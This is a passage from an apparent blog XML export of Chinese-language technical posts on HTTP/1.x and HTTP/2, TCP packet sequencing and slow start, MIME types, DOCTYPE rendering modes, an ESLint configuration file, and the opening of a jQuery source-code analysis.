15:55:28 GMTServer: Apache 0.84&lt;html&gt; &lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt; 回应的格式是”头信息 + 一个空行（\r\n） + 数据”。其中，第一行是”协议版本 + 状态码（status code） + 状态描述”。 3.3 Content-Type 字段关于字符的编码，1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是Content-Type字段的作用。下面是一些常见的Content-Type字段的值。123456789101112text/plaintext/htmltext/cssimage/jpegimage/pngimage/svg+xmlaudio/mp4video/mp4application/javascriptapplication/pdfapplication/zipapplication/atom+xml 这些数据类型总称为MIME type，每个值包括一级类型和二级类型，之间用斜杠分隔。除了预定义的类型，厂商也可以自定义类型。MIME type 说明 application/vnd.debian.binary-package上面的类型表明，发送的是Debian系统的二进制数据包。 MIME type还可以在尾部使用分号，添加参数。1Content-Type: text/html; charset=utf-8 上面的类型表明，发送的是网页，而且编码是UTF-8。 客户端请求的时候，可以使用Accept字段声明自己可以接受哪些数据格式。1Accept: */* 上面代码中，客户端声明自己可以接受任何格式的数据。 3.4 Content-Encoding 字段由于发送的数据可以是任何格式，因此可以把数据压缩后再发送。Content-Encoding字段说明数据的压缩方法。123Content-Encoding: gzipContent-Encoding: compressContent-Encoding: deflate 客户端在请求时，用Accept-Encoding字段说明自己可以接受哪些压缩方法。1Accept-Encoding: gzip, deflate 3.5 1.0与1.1差异3.5.1 版的最大变化，就是引入了持久连接（persistent connection），即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection: keep-alive。客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。不过，规范的做法是，客户端在最后一个请求时，发送Connection: close，明确要求服务器关闭TCP连接。1Connection: close 目前，对于同一个域名，大多数浏览器允许同时建立6个持久连接。 3.5.2 管道机制1.1 版还引入了管道机制（pipelining），即在同一个TCP连接里面，客户端可以同时发送多个请求。这样就进一步改进了HTTP协议的效率。 举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送A请求，然后等待服务器做出回应，收到后再发出B请求。管道机制则是允许浏览器同时发出A请求和B请求，但是服务器还是按照顺序，先回应A请求，完成后再回应B请求。 3.5.3 Content-Length 字段一个TCP连接现在可以传送多个回应，势必就要有一种机制，区分数据包是属于哪一个回应的。这就是Content-length字段的作用，声明本次回应的数据长度。1Content-Length: 3495 上面代码告诉浏览器，本次回应的长度是3495个字节，后面的字节就属于下一个回应了。 在1.0版中，Content-Length字段不是必需的，因为浏览器发现服务器关闭了TCP连接，就表明收到的数据包已经全了。 3.5.4 分块传输编码使用Content-Length字段的前提条件是，服务器发送回应之前，必须知道回应的数据长度。 对于一些很耗时的动态操作来说，这意味着，服务器要等到所有操作完成，才能发送数据，显然这样的效率不高。更好的处理方法是，产生一块数据，就发送一块，采用”流模式”（stream）取代”缓存模式”（buffer）。 因此，1.1版规定可以不使用Content-Length字段，而使用”分块传输编码”（chunked transfer encoding）。只要请求或回应的头信息有Transfer-Encoding字段，就表明回应将由数量未定的数据块组成。1Transfer-Encoding: chunked 每个非空的数据块之前，会有一个16进制的数值，表示这个块的长度。最后是一个大小为0的块，就表示本次回应的数据发送完了。下面是一个例子。 1234567891011121314151617HTTP/1.1 200 OKContent-Type: text/plainTransfer-Encoding: chunked25This is the data in the first chunk1Cand this is the second one3con8sequence0 3.5.5 其他功能1.1版还新增了许多动词方法：PUT、PATCH、HEAD、OPTIONS、DELETE。 另外，客户端请求的头信息新增了Host字段，用来指定服务器的域名。1Host: www.example.com 有了Host字段，就可以将请求发往同一台服务器上的不同网站，为虚拟主机的兴起打下了基础。 3.6 HTTP之状态码状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:1234567891xx：指示信息--表示请求已接收，继续处理2xx：成功--表示请求已被成功接收、理解、接受3xx：重定向--要完成请求必须进行更进一步的操作4xx：客户端错误--请求有语法错误或请求无法实现5xx：服务器端错误--服务器未能实现合法的请求 常见状态码：12345678910100 Continue // 继续。客户端应继续其请求200 OK // 客户端请求成功301 Moved Permanently // 资源（网页等）被永久转移到其它URL304 Not Modified // 未修改，客户端使用缓存400 Bad Request // 客户端请求有语法错误，不能被服务器所理解401 Unauthorized // 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用403 Forbidden // 服务器收到请求，但是拒绝提供服务404 Not Found // 请求资源不存在，eg：输入了错误的URL500 Internal Server Error // 服务器发生不可预期的错误503 Server Unavailable // 服务器当前不能处理客户端的请求，一段时间后可能恢复正常 更多状态请查看 3.7 HTTP请求方法根据HTTP标准，HTTP请求可以使用多种请求方法。 HTTP1.0定义了三种请求方法： GET, POST和HEAD方法。 HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE和CONNECT方法。 方法 说明 GET 请求指定的页面信息，并返回实体主体。 HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 DELETE 请求服务器删除指定的页面。 CONNETCT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 OPTIOINS 允许客户端查看服务器的性能。 TRACE 回显服务器收到的请求，主要用于测试或诊断。 3.8 HTTP/1.1 缺点虽然1.1版允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为”队头堵塞”（Head-of-line blocking）。 为了避免这个问题，只有两种方法：一是减少请求数，二是同时多开持久连接。这导致了很多的网页优化技巧，比如合并脚本和样式表、将图片嵌入CSS代码、域名分片（domain sharding）等等。如果HTTP协议设计得更好一些，这些额外的工作是可以避免的。 四、SPDY 协议2009年，谷歌公开了自行研发的 SPDY 协议，主要解决 HTTP/1.1 效率不高的问题。 这个协议在Chrome浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。 五、HTTP/22015年，HTTP/2 发布。它不叫 HTTP/2.0，是因为标准委员会不打算再发布子版本了，下一个新版本将是 HTTP/3。 5.1 二进制协议HTTP/1.1 版的头信息肯定是文本（ASCII编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”（frame）：头信息帧和数据帧。 二进制协议的一个好处是，可以定义额外的帧。HTTP/2 定义了近十种帧，为将来的高级应用打好了基础。如果使用文本实现这种功能，解析数据将会变得非常麻烦，二进制解析则方便得多。 5.2 多工HTTP/2 复用TCP连接，在一个连接里，客户端和浏览器都可以同时发送多个请求或回应，而且不用按照顺序一一对应，这样就避免了”队头堵塞”。 举例来说，在一个TCP连接里面，服务器同时收到了A请求和B请求，于是先回应A请求，结果发现处理过程非常耗时，于是就发送A请求已经处理好的部分， 接着回应B请求，完成后，再发送A请求剩下的部分。 这样双向的、实时的通信，就叫做多工（Multiplexing）。 5.3 数据流因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的回应。因此，必须要对数据包做标记，指出它属于哪个回应。 HTTP/2 将每个请求或回应的所有数据包，称为一个数据流（stream）。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流ID，用来区分它属于哪个数据流。另外还规定，客户端发出的数据流，ID一律为奇数，服务器发出的，ID为偶数。 数据流发送到一半的时候，客户端和服务器都可以发送信号（RST_STREAM帧），取消这个数据流。1.1版取消数据流的唯一方法，就是关闭TCP连接。这就是说，HTTP/2 可以取消某一次请求，同时保证TCP连接还打开着，可以被其他请求使用。 客户端还可以指定数据流的优先级。优先级越高，服务器就会越早回应。 5.4 头信息压缩HTTP 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如Cookie和User Agent，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。 HTTP/2 对这一点做了优化，引入了头信息压缩机制（header compression）。一方面，头信息使用gzip或compress压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就提高速度了。 5.5 服务器推送HTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送（server push）。 常见场景是客户端请求一个网页，这个网页里面包含很多静态资源。正常情况下，客户端必须收到网页后，解析HTML源码，发现有静态资源，再发出静态资源请求。其实，服务器可以预期到客户端请求网页后，很可能会再请求静态资源，所以就主动把这些静态资源随着网页一起发给客户端了。]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-TCP协议简介]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_TCP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[TCP协议简介TCP 是互联网核心协议之一，本文介绍它的基础知识。 一、TCP 协议的作用互联网由一整套协议构成。TCP 只是其中的一层，有着自己的分工。 （图片说明：TCP 是以太网协议和 IP 协议的上层协议，也是应用层协议的下层协议。） 最底层的以太网协议（Ethernet）规定了电子信号如何组成数据包（packet），解决了子网内部的点对点通信。 （图片说明：以太网协议解决了局域网的点对点通信。） 但是，以太网协议不能解决多个局域网如何互通，这由 IP 协议解决。 （图片说明：IP 协议可以连接多个局域网。） IP 协议定义了一套自己的地址规则，称为 IP 地址。它实现了路由功能，允许某个局域网的 A 主机，向另一个局域网的 B 主机发送消息。 （图片说明：路由器就是基于 IP 协议。局域网之间要靠路由器连接。） 路由的原理很简单。市场上所有的路由器，背后都有很多网口，要接入多根网线。路由器内部有一张路由表，规定了 A 段 IP 地址走出口一，B 段地址走出口二，……通过这套”指路牌”，实现了数据包的转发。 （图片说明：本机的路由表注明了不同 IP 目的地的数据包，要发送到哪一个网口（interface）。） IP 协议只是一个地址协议，并不保证数据包的完整。如果路由器丢包（比如缓存满了，新进来的数据包就会丢失），就需要发现丢了哪一个包，以及如何重新发送这个包。这就要依靠 TCP 协议。 简单说，TCP 协议的作用是，保证数据通信的完整性和可靠性，防止丢包。 二、TCP 数据包的大小以太网数据包（packet）的大小是固定的，最初是1518字节，后来增加到1522字节。其中， 1500 字节是负载（payload），22字节是头信息（head）。IP 数据包在以太网数据包的负载里面，它也有自己的头信息，最少需要20字节，所以 IP 数据包的负载最多为1480字节。 （图片说明：IP 数据包在以太网数据包里面，TCP 数据包在 IP 数据包里面。） TCP 数据包在 IP 数据包的负载里面。它的头信息最少也需要20字节，因此 TCP 数据包的最大负载是 1480 - 20 = 1460 字节。由于 IP 和 TCP 协议往往有额外的头信息，所以 TCP 负载实际为1400字节左右。 因此，一条1500字节的信息需要两个 TCP 数据包。HTTP/2 协议的一大改进， 就是压缩 HTTP 协议的头信息，使得一个 HTTP 请求可以放在一个 TCP 数据包里面，而不是分成多个，这样就提高了速度。 （图片说明：以太网数据包的负载是1500字节，TCP 数据包的负载在1400字节左右。） 三、TCP 数据包的编号（SEQ）一个包1400字节，那么一次性发送大量数据，就必须分成多个包。比如，一个 10MB 的文件，需要发送7100多个包。 发送的时候，TCP 协议为每个包编号（sequence number，简称 SEQ），以便接收的一方按照顺序还原。万一发生丢包，也可以知道丢失的是哪一个包。 第一个包的编号是一个随机数。为了便于理解，这里就把它称为1号包。假定这个包的负载长度是100字节，那么可以推算出下一个包的编号应该是101。这就是说，每个数据包都可以得到两个编号：自身的编号，以及下一个包的编号。接收方由此知道，应该按照什么顺序将它们还原成原始文件。 （图片说明：当前包的编号是45943，下一个数据包的编号是46183，由此可知，这个包的负载是240字节。） 四、TCP 数据包的组装收到 TCP 数据包以后，组装还原是操作系统完成的。应用程序不会直接处理 TCP 数据包。 对于应用程序来说，不用关心数据通信的细节。除非线路异常，收到的总是完整的数据。应用程序需要的数据放在 TCP 数据包里面，有自己的格式（比如 HTTP 协议）。 TCP 并没有提供任何机制，表示原始文件的大小，这由应用层的协议来规定。比如，HTTP 协议就有一个头信息Content-Length，表示信息体的大小。对于操作系统来说，就是持续地接收 TCP 数据包，将它们按照顺序组装好，一个包都不少。 操作系统不会去处理 TCP 数据包里面的数据。一旦组装好 TCP 数据包，就把它们转交给应用程序。TCP 数据包里面有一个端口（port）参数，就是用来指定转交给监听该端口的应用程序。 （图片说明：系统根据 TCP 数据包里面的端口，将组装好的数据转交给相应的应用程序。上图中，21端口是 FTP 服务器，25端口是 SMTP 服务，80端口是 Web 服务器。） 应用程序收到组装好的原始数据，以浏览器为例，就会根据 HTTP 协议的Content-Length字段正确读出一段段的数据。这也意味着，一次 TCP 通信可以包括多个 HTTP 通信。 五、慢启动和 ACK服务器发送数据包，当然越快越好，最好一次性全发出去。但是，发得太快，就有可能丢包。带宽小、路由器过热、缓存溢出等许多因素都会导致丢包。线路不好的话，发得越快，丢得越多。 最理想的状态是，在线路允许的情况下，达到最高速率。但是我们怎么知道，对方线路的理想速率是多少呢？答案就是慢慢试。 TCP 协议为了做到效率与可靠性的统一，设计了一个慢启动（slow start）机制。开始的时候，发送得较慢，然后根据丢包的情况，调整速率：如果不丢包，就加快发送速度；如果丢包，就降低发送速度。 Linux 内核里面设定了（常量TCP_INIT_CWND），刚开始通信的时候，发送方一次性发送10个数据包，即”发送窗口”的大小为10。然后停下来，等待接收方的确认，再继续发送。 默认情况下，接收方每收到两个 TCP 数据包，就要发送一个确认消息。”确认”的英语是 acknowledgement，所以这个确认消息就简称 ACK。 ACK 携带两个信息。 121. 期待要收到下一个数据包的编号2. 接收方的接收窗口的剩余容量 发送方有了这两个信息，再加上自己已经发出的数据包的最新编号，就会推测出接收方大概的接收速度，从而降低或增加发送速率。这被称为”发送窗口”，这个窗口的大小是可变的。 （图片说明：每个 ACK 都带有下一个数据包的编号，以及接收窗口的剩余容量。双方都会发送 ACK。） 注意，由于 TCP 通信是双向的，所以双方都需要发送 ACK。两方的窗口大小，很可能是不一样的。而且 ACK 只是很简单的几个字段，通常与数据合并在一个数据包里面发送。 （图片说明：上图一共4次通信。第一次通信，A 主机发给B 主机的数据包编号是1，长度是100字节，因此第二次通信 B 主机的 ACK 编号是 1 + 100 = 101，第三次通信 A 主机的数据包编号也是 101。同理，第二次通信 B 主机发给 A 主机的数据包编号是1，长度是200字节，因此第三次通信 A 主机的 ACK 是201，第四次通信 B 主机的数据包编号也是201。） 即使对于带宽很大、线路很好的连接，TCP 也总是从10个数据包开始慢慢试，过了一段时间以后，才达到最高的传输速率。这就是 TCP 的慢启动。 六、数据包的遗失处理TCP 协议可以保证数据通信的完整性，这是怎么做到的？ 前面说过，每一个数据包都带有下一个数据包的编号。如果下一个数据包没有收到，那么 ACK 的编号就不会发生变化。 举例来说，现在收到了4号包，但是没有收到5号包。ACK 就会记录，期待收到5号包。过了一段时间，5号包收到了，那么下一轮 ACK 会更新编号。如果5号包还是没收到，但是收到了6号包或7号包，那么 ACK 里面的编号不会变化，总是显示5号包。这会导致大量重复内容的 ACK。 如果发送方发现收到三个连续的重复 ACK，或者超时了还没有收到任何 ACK，就会确认丢包，即5号包遗失了，从而再次发送这个包。通过这种机制，TCP 保证了不会有数据包丢失。 （图片说明：Host B 没有收到100号数据包，会连续发出相同的 ACK，触发 Host A 重发100号数据包。）]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-MIME type]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_MIME-type%2F</url>
    <content type="text"><![CDATA[MIME type一、简介MIME 和 MIME type 并不是一个东西，MIME 的全称是 Multipurpose Internet Mail Extensions，它扩展了电子邮件标准，比如使得邮件支持非文本格式附件（二进制、声音、图像等）。后来 HTTP 协议也是用了 MIME 框架，使得 MIME 被扩展为 互联网媒体类型(Internet media type)，也就是 MIME type，或者叫 MIME 类型。 语法语法如下： 1type/subtype 其中 type 是主要类型，可以是离散类型(discrete type) 或者 多部分类型(multipart type)。 discrete type 包含有：text、image、audio、video、application。 subtype 可以理解为每个主要类型(type)的子类型，或者具体类型。 举例： 123456789101112text/plaintext/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4application/octet-streammultipart/form-datamultipart/byteranges 所有的 MIME type 可以看这里 MIME type 列表 二、MIME type 的作用文件的扩展名在网络中是没有意义的，决定一个文件类型的就是 MIME type，在 HTTP 中就是响应头中的 Content-Type，比如： 1Content-Type: text/HTML 其中 text/HTML 就是一种 MIME type，表示内容是 text/HTML 类型，也就是超文本文件。 在使用表单空间选择文件时，我们常常需要限制用户所能够选择的文件，比如只允许用户选择 Excel 表格文件，我们可以这样写： 1&lt;input type="file" accept="application/vnd.ms-excel, application/x-excel"&gt; 其中 application/vnd.ms-excel 和 application/x-excel 就是两个 MIME type。]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>MIME</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-文档模式《!DOCTYPE》]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_%E6%96%87%E6%A1%A3%E6%A8%A1%E5%BC%8F%3C!DOCTYPE%3E%2F</url>
    <content type="text"><![CDATA[文档模式严格模式与混杂模式不同文档模式的由来相信了解过浏览器或浏览器厂商发展历史的同学都知道，在浏览器的发展初期，是没有什么标准可言的，各大浏览器厂商各自实现一套解析文档的方式，这对于开发者来说就如同灾难一样，开发者需要针对不同厂商的浏览器做兼容处理。慢慢的人们开始注意到标准的重要性，并成立了规范组织制定相应的标准，各个浏览器厂商也开始向标准靠拢，但随之而来的问题就是，如果一味的向标准靠拢，那必然会导致一个问题：老旧的网站将无法正常显示。为了做到向后兼容，浏览器厂商就保留了原有的文档解析方式，也就是现在所说的 混杂模式，同时将向标准靠拢的解析方式称为 标准模式，又称 严格模式。 也就是说，两种模式所代表的是浏览器解析文档的方式。而至于如果开启这两种模式，可以使用 &lt;!DOCTYPE&gt; 标签。 文档类型&lt;!DOCTYPE&gt;&lt;!DOCTYPE&gt; 用来声明文档类型，目的告诉浏览器使用哪种模式去解析文档。说白了就是告诉浏览器在解析文档的时候是采用 混杂模式 还是 标准模式。 开启 混杂模式(quirks mode)如果浏览器发现在文档开始处没有 文档类型声明，即没有 &lt;!DOCTYPE&gt; 标签，那么浏览器默认会使用混杂模式解析文档，当然不写 &lt;!DOCTYPE&gt; 标签是极其不推荐的方式。 开启 标准模式(standards mode)12345678&lt;!-- HTML 4.01 严格型 --&gt;&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;&lt;!-- XHTML 1.0 严格型 --&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;&lt;!-- HTML 5 --&gt;&lt;!doctype html&gt; 以上三种的任意一种都可以触发标准模式 doctype详解 &lt;!DOCTYPE&gt;声明必须处于HTML文档的头部，在&lt;html&gt;标签之前，HTML5中不区分大小写 &lt;!DOCTYPE&gt;声明不是一个HTML标签，是一个用于告诉浏览器当前HTMl版本的指令 现代浏览器的html布局引擎通过检查doctype决定使用兼容模式还是标准模式对文档进行渲染，一些浏览器有一个接近标准模型。 在HTML4.01中&lt;!DOCTYPE&gt;声明指向一个DTD，由于HTML4.01基于SGML，所以DTD指定了标记规则以保证浏览器正确渲染内容 HTML5不基于SGML，所以不用指定DTD 常见dotype HTML4.01 strict：不允许使用表现性、废弃元素（如font）以及frameset。声明： 1&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt; HTML4.01 Transitional:允许使用表现性、废弃元素（如font），不允许使用frameset。声明： 1&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt; HTML4.01 Frameset:允许表现性元素，废气元素以及frameset。声明： 1&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd"&gt; XHTML1.0 Strict:不使用允许表现性、废弃元素以及frameset。文档必须是结构良好的XML文档。声明： 1&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt; XHTML1.0 Transitional:允许使用表现性、废弃元素，不允许frameset，文档必须是结构良好的XMl文档。声明： 1&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt; XHTML 1.0 Frameset:允许使用表现性、废弃元素以及frameset，文档必须是结构良好的XML文档。声明： 1&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd"&gt; HTML 5: 1&lt;!doctype html&gt;]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>DOCTYPE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[综合-eslint使用与配置]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BB%BC%E5%90%88_eslint%2F</url>
    <content type="text"><![CDATA[简介ESLint 由 JavaScript 红宝书 作者 Nicholas C. Zakas 编写， 2013 年发布第一个版本。 NCZ 的初衷不是重复造一个轮子，而是在实际需求得不到 JSHint 团队响应的情况下做出的选择：以可扩展、每条规则独立、不内置编码风格为理念编写一个 lint 工具。官网 特点 默认规则包含所有 JSLint、JSHint 中存在的规则，易迁移； 规则可配置性高：可设置「警告」、「错误」两个 error 等级，或者直接禁用； 包含代码风格检测的规则（可以丢掉 JSCS 了）； 支持插件扩展、自定义规则。 .eslintrc.js文件配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175module.exports = &#123; /* 运行环境 */ /* 所有运行环境可查询https://eslint.org/docs/user-guide/configuring#specifying-environments */ "env": &#123; "browser": true, "es6": true &#125;, /* 支持的语法规则 */ "parserOptions": &#123; "ecmaVersion": 6, // 3、5(默认)、6 "sourceType": "module", "ecmaFeatures": &#123; // 表示一些附加特性的对象 "jsx": true, "modules": true, "experimentalObjectRestSpread": true &#125; &#125;, /* 第三方插件 */ /* 需要安装 eslint-plugin-vue */ "plugins": ["vue"], /* 规则 */ /* error =&gt; 2; warn =&gt; 1; off =&gt; 0 */ "rules": &#123; /* 缩进 tab */ "indent": [ "error", 4, &#123; "SwitchCase": 1 &#125; ], /* 使用单引号 */ "quotes": [ "error", "single" ], /* 分号必须 */ "semi": [ "error", "always" ], /* 函数不允许有重复的参数 */ "no-dupe-args": "error", /* 不允许有多余的分号 */ "no-extra-semi": "error", /* 不允许有多余的空格 */ "no-multi-spaces": "error", /* 禁止变量重复声明 */ "no-redeclare": "error", /* 禁止未使用的变量 */ "no-unused-vars": "error", /** * 逗号前不可以有空格，逗号后必须有空格。 * 变量声明： * ✅var a = 1, b = 2 * 数组： * ✅[1, 2] * 对象： * ✅&#123;a: 1, b: 2&#125; * 函数参数： * ✅function (a, b) &#123;&#125; * ✅fn(1, 2) */ "comma-spacing": [ "error", &#123; "before": false, "after": true &#125; ], /** * 调用函数时，禁止函数名称与括号间的间隔 * ❎：fn () * ✅：fn() */ "func-call-spacing": "error", /** * 对象字面量冒号前不允许有空格，冒号后必须且只有一个空格 * ✅：&#123;a: 1&#125; * ✅：&#123; * a: 1, * b: 2 * &#125; */ "key-spacing": [ "error", &#123; "beforeColon": false, "afterColon": true, "mode": "strict" &#125; ], /** * 关键字前后各至少一个空格，包括的关键字查看： * http://eslint.org/docs/rules/keyword-spacing#rule-details */ "keyword-spacing": [ "error", ], /** * 变量声明后强制一个空行，生命变量包括使用 var let const 等 */ "newline-after-var": "error", // 语句块前必须要有空格，语句块只得就是花括号 &#123;&#125; "space-before-blocks": "error", /** * function 关键之与后边第一个圆括号之间必须有空格。包括：匿名函数、命名函数、async修饰的箭头函数 * ✅：function () &#123;&#125; * ✅：function set () &#123;&#125; * ✅：class Foo &#123; * constructor () &#123; * // ... * &#125; * &#125; * ✅：let foo = &#123; * bar () &#123; * // ... * &#125; * &#125;; * ✅：let foo = async (a) =&gt; await a */ "space-before-function-paren": [ "error", &#123; "anonymous": "always", "named": "always", "asyncArrow": "always" &#125; ], // 多元运算符前后要有空格 "space-infix-ops": "error", /** * 一元关键字运算符(操作符)后必须有空格：new, delete, typeof, void, yield 等 * 一元运算符前后不能有空格如：-, +, --, ++, !, !! 等 * ✅：new Foo(); * ✅：++foo; * ✅：foo--; * ✅：-foo; * ✅：+"3"; */ "space-unary-ops": [ "error", &#123; "words": true, "nonwords": false &#125; ], // ================================ 以下是 ES6 规范 ================================ /** * 箭头函数中的箭头前后必须各有一个空格 * ✅：() =&gt; 1 */ "arrow-spacing": "error", /** * 继承时子类的 constructor 方法中必须调用 super 方法 * ✅：class A extends B &#123; * constructor() &#123; * super(); * &#125; * &#125; */ "constructor-super": "error", // 不允许给常量(const)赋值 "no-const-assign": "error", // 在 constructor 中不允许在 super 方法被调用之前调用 this 或 super 关键字 "no-this-before-super": "error", // 不允许使用 var 声明变量，使用 let 或 const 代替 "no-var": "error" &#125;&#125;]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>工具配置</tag>
        <tag>eslint</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery_源码分析_奇淫技巧]]></title>
    <url>%2F2017%2F04%2F17%2FjQuery_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[系列第一篇： 【深入浅出jQuery】源码浅析–整体架构 本篇是系列第二篇，标题起得有点大，希望内容对得起这个标题，这篇文章主要总结一下在 jQuery 中一些十分讨巧的 coding 方式，将会由浅及深，可能会有一些基础，但是我希望全面一点，对看文章的人都有所帮助，源码我还一直在阅读，也会不断的更新本文。 即便你不想去阅读源码，看看下面的总结，我想对提高编程能力，转换思维方式都大有裨益，废话少说，进入正题。 短路表达式 与 多重短路表达式短路表达式这个应该人所皆知了。在 jQuery 中，大量的使用了短路表达式与多重短路表达式。 短路表达式：作为”&amp;&amp;”和”||”操作符的操作数表达式，这些表达式在进行求值时，只要最终的结果已经可以确定是真或假，求值过程便告终止，这称之为短路求值。这是这两个操作符的一个重要属性。1234567891011121314151617// ||短路表达式var foo = a || b;// 相当于if(a)&#123; foo = a;&#125;else&#123; foo = b;&#125;// &amp;&amp;短路表达式var bar = a &amp;&amp; b;// 相当于if(a)&#123; bar = b;&#125;else&#123; bar = a;&#125; 当然，上面两个例子是短路表达式最简单是情况，多数情况下，jQuery 是这样使用它们的：123456789// 选自 jQuery 源码中的 Sizzle 部分function siblingCheck(a, b) &#123; var cur = b &amp;&amp; a, diff = cur &amp;&amp; a.nodeType === 1 &amp;&amp; b.nodeType === 1 &amp;&amp; (~b.sourceIndex || MAX_NEGATIVE) - (~a.sourceIndex || MAX_NEGATIVE); // other code ...&#125; 嗯，可以看到，diff 的值经历了多重短路表达式配合一些全等判断才得出，这种代码很优雅，但是可读性下降了很多，使用的时候权衡一下，多重短路表达式和简单短路表达式其实一样，只需要先把后面的当成一个整体，依次推进，得出最终值。1234var a = 1, b = 0, c = 3;var foo = a &amp;&amp; b &amp;&amp; c, // 0 ,相当于 a &amp;&amp; (b &amp;&amp; c) bar = a || b || c; // 1 这里需要提出一些值得注意的点： 1、在 Javascript 的逻辑运算中，0、&quot;&quot;、null、false、undefined、NaN 都会判定为 false ，而其他都为 true ； 2、因为 Javascript 的内置弱类型域 (weak-typing domain)，所以对严格的输入验证这一点不太在意，即便使用 &amp;&amp; 或者 || 运算符的运算数不是布尔值，仍然可以将它看作布尔运算。虽然如此，还是建议如下：12if(foo)&#123; ... &#125; //不够严谨if(!!foo)&#123; ... &#125; //更为严谨，!!可将其他类型的值转换为boolean类型 注重细节，JavaScript 既不弱也不低等，我们只是需要更努力一点工作以使我们的代码变得真正健壮。 预定义常用方法的入口在 jQuery 的头几十行，有这么一段有趣的代码：1234567891011121314151617(function(window, undefined) &#123; var // 定义了一个对象变量，一个字符串变量，一个数组变量 class2type = &#123;&#125;, core_version = "1.10.2", core_deletedIds = [], // 保存了对象、字符串、数组的一些常用方法 concat push 等等... core_concat = core_deletedIds.concat, core_push = core_deletedIds.push, core_slice = core_deletedIds.slice, core_indexOf = core_deletedIds.indexOf, core_toString = class2type.toString, core_hasOwn = class2type.hasOwnProperty, core_trim = core_version.trim;&#125;)(window); 不得不说，jQuery 在细节上做的真的很好，这里首先定义了一个对象变量、一个字符串变量、数组变量，要注意这 3 个变量本身在下文是有自己的用途的（可以看到，jQuery 作者惜字如金，真的是去压榨每一个变量的作用，使其作用最大化）；其次，借用这三个变量，再定义些常用的核心方法，从上往下是数组的 concat、push 、slice 、indexOf 方法，对象的 toString 、hasOwnProperty 方法以及字符串的 trim 方法，core_xxxx 这几个变量事先存储好了这些常用方法的入口，如果下文行文当中需要调用这些方法，将会：12345678910jQuery.fn = jQuery.prototype = &#123; // ... // 将 jQuery 对象转换成数组类型 toArray: function() &#123; // 调用数组的 slice 方法，使用预先定义好了的 core_slice ，节省查找内存地址时间，提高效率 // 相当于 return 